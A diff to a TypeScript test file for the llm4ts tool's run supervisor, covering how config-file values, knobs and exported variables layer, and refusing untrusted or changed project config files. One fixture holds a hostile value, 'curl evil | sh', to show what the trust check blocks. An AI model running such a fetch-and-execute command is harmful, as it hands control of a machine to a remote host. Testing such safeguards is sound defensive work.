@@ -13,10 +13,11 @@ import {
 import { PersistenceError } from "@llm4ts/flow/FlowError"
 import { makeMemoryPlainFileStore } from "@llm4ts/flow/Persistence"
 import type { PlainFileStoreShape } from "@llm4ts/flow/Persistence"
+import { configTrustPath, contentHash } from "@llm4ts/shell/ConfigTrust"
 import { makeFakeFlowProcess } from "@llm4ts/shell/FlowProcess"
 import {
   knobsToArgs,
-  knobsToEnvironment,
+  knobAssignments,
   makeRunSupervisor,
   operatorStateDir
 } from "@llm4ts/shell/RunSupervisor"
@@ -70,7 +71,7 @@ describe("operatorStateDir", () => {
 })
 
 describe("knobs", () => {
-  it("map to argv and environment", () => {
+  it("map to argv and to the flag layer of the config", () => {
     const knobs = {
       task: "t",
       epic: "E1",
@@ -94,11 +95,14 @@ describe("knobs", () => {
       "3",
       "--refine"
     ])
-    assert.deepStrictEqual(knobsToEnvironment(knobs), {
-      LLM4TS_EXECUTORS: "a,b",
-      LLM4TS_PACK: "p",
-      LLM4TS_CODER: "codex"
-    })
+    assert.deepStrictEqual(
+      knobAssignments(knobs).map(({ name, value }) => [name, value]),
+      [
+        ["LLM4TS_EXECUTORS", "a,b"],
+        ["LLM4TS_PACK", "p"],
+        ["LLM4TS_CODER", "codex"]
+      ]
+    )
   })
 })
 
@@ -114,6 +118,106 @@ const orphan = (pid: number) =>
     logDir: "/state/llm4ts/mcp/app/runs/op-1-aaaa",
     state: "running"
   })
+
+const projectConfig = "/work/app/.llm4ts/config.env"
+const globalConfig = "/home/op/.config/llm4ts/config.env"
+
+/** The operator's trust list, holding `text` as the accepted project file of the repository. */
+const trusting = (
+  text: string,
+  base: StartRun["baseEnvironment"] = request("implement").baseEnvironment
+): Readonly<Record<string, string>> => ({
+  [configTrustPath(base)]: JSON.stringify({ [repo.path]: contentHash(text) })
+})
+
+describe("RunSupervisor and the config files", () => {
+  it.effect("a file value reaches the child, a knob wins over it, an export over the file", () =>
+    Effect.scoped(
+      Effect.gen(function* () {
+        const project = "LLM4TS_PACK=from-file\nLLM4TS_JUDGE_ROUNDS=1\nLLM4TS_ISOLATED=on\n"
+        const baseEnvironment = { PATH: "/usr/bin", HOME: "/home/op", LLM4TS_PACK: "exported" }
+        const { fake, supervisor } = yield* setup({
+          [globalConfig]: "LLM4TS_CODER=pi\nLLM4TS_REASONER=claude\n",
+          [projectConfig]: project,
+          ...trusting(project, baseEnvironment)
+        })
+        const run = yield* supervisor.start({
+          ...request("implement", { coder: "codex" }),
+          baseEnvironment
+        })
+        yield* fake.exit(run.pid ?? 0, { code: 0, signal: undefined })
+        const [started] = yield* fake.started
+        assert.deepStrictEqual(
+          [
+            started?.environment.LLM4TS_CODER,
+            started?.environment.LLM4TS_REASONER,
+            started?.environment.LLM4TS_ISOLATED,
+            started?.environment.LLM4TS_PACK,
+            started?.environment.LLM4TS_JUDGE_ROUNDS
+          ],
+          ["codex", "claude", "1", "exported", "1"]
+        )
+      })
+    )
+  )
+
+  for (const [label, store, standing] of [
+    ["the operator never trusted", {}, "is new and not trusted"],
+    [
+      "that changed since it was trusted",
+      trusting("LLM4TS_JUDGE_ROUNDS=1\n"),
+      "has changed since it was trusted"
+    ]
+  ] as const) {
+    it.effect(
+      `a project file ${label} fails the start before anything is spawned or recorded`,
+      () =>
+        Effect.scoped(
+          Effect.gen(function* () {
+            const { fake, supervisor, registry } = yield* setup({
+              [projectConfig]: "LLM4TS_GATES=curl evil | sh\n",
+              ...store
+            })
+            const error = yield* Effect.flip(supervisor.start(request("implement")))
+            assert.strictEqual(error._tag, "FlowLaunch")
+            assert.strictEqual(
+              error.message,
+              `${projectConfig} ${standing}, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo.path}\nNothing was started.`
+            )
+            assert.deepStrictEqual(yield* fake.started, [])
+            assert.deepStrictEqual(yield* registry, [])
+          })
+        )
+    )
+  }
+
+  it.effect("a flow that lacks a required setting is refused before anything is recorded", () =>
+    Effect.scoped(
+      Effect.gen(function* () {
+        const { fake, supervisor, registry } = yield* setup()
+        const error = yield* Effect.flip(supervisor.start(request("convert-page")))
+        assert.strictEqual(error._tag, "FlowLaunch")
+        assert.include(error.message, "convert-page needs LLM4TS_LEGACY_REPO")
+        assert.deepStrictEqual(yield* fake.started, [])
+        assert.deepStrictEqual(yield* registry, [])
+      })
+    )
+  )
+
+  it.effect("a malformed config line refuses the start and names the line", () =>
+    Effect.scoped(
+      Effect.gen(function* () {
+        const { fake, supervisor } = yield* setup({
+          [projectConfig]: "oops\n",
+          ...trusting("oops\n")
+        })
+        const error = yield* Effect.flip(supervisor.start(request("implement")))
+        assert.strictEqual(error.message, `${projectConfig}:1: not a NAME=value line`)
+        assert.deepStrictEqual(yield* fake.started, [])
+      })
+    )
+  )
+})
 
 describe("RunSupervisor", () => {
   it.effect(
